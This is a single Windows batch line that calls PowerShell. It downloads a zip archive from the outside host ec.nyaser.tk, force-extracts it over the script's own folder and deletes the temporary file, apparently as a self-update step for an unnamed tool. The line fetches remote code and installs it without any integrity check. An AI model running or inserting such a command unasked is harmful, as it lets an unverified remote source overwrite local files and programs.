powershell "$t=[System.IO.Path]::GetTempFileName()+'.zip';Invoke-WebRequest -Uri https://ec.nyaser.tk/u -OutFile $t;Expand-Archive -Path $t -DestinationPath %~dp0 -Force;ri $t"||cmd/k